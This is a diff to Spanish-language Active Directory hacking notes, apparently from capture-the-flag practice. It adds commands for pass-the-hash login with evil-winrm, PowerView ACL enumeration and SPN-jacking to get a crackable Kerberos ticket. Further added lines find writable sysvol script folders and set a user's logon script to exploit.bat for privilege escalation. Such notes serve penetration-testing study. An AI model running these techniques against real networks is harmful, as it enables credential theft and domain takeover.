@@ -592,19 +592,20 @@ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
 
 Ejemplo 3, explotacion de RSA_4810
 Para detectarlo usaremos:  <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1?source=post_page-----ecbaec77e161--------------------------------">PowerView</a>
-![Vulnerabilidad de grupo RSA_4810](/assets/images/Hacking-Windows/vul.png)
+
 ```s
 . ./PowerView.ps1
 
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "nu_1055"}
 ```
+![Vulnerabilidad de grupo RSA_4810](/assets/images/Hacking-Windows/vul.png)
 
 Para explotarlo usaremos SPN-Jacking attack
 ```s
 Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='test/tester'}
 Get-DomainSPNTicket -SPN test/tester
 ```
-
+Obtendremos el TGS ticket y ahora podemos usar john para hacer una fuerza bruta del ticket.
 
 Parte de la enumeracion, tenemos el comando
 ```s
@@ -612,7 +613,17 @@ cmdkey /list
 ```
 Aqui en la enumeracion podemos ver que las credenciales de Administrador estan guardadas para ejecutar runas por ejemplo, maquina Access para mas info. Donde se clonara el proyecto Nishang/Shells/Invoke-PowershellTcp.ps1.
 
-
+En la enumeracion, podemos ver los scripts de dominio y encontrar permisos de escritura dentro de alguna de las carpetas a algun usuario que tengamos
+```s
+cd Windows\sysvol\domain\scripts
+icacls 11DBDAEB100D
+icacls A2BFDCF13BB2
+icacls A32FF3AEAA23
+```
+Ahora solo tendriamos que cambiar los permisos del exploit.bat
+```s
+Set-ADUser -Identity SSA_6010 -ScriptPath "exploit.bat"
+```
 
 Podemos usar una tool que nos sugiere como explotar un cve para la escalada d elos privilegios
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
